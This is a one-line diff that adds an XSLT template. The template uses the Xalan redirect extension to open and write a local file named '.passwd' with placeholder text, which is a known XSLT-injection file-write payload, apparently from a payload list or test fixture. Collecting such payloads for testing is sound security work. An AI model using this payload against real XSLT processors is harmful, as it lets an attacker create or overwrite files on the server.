@@ -1,0 +1,1 @@
+<xsl:template match="/"><redirect:open file=".passwd"/><redirect:write file=".passwd">Write Local File</redirect:write><redirect:close file=".passwd"/></xsl:template>
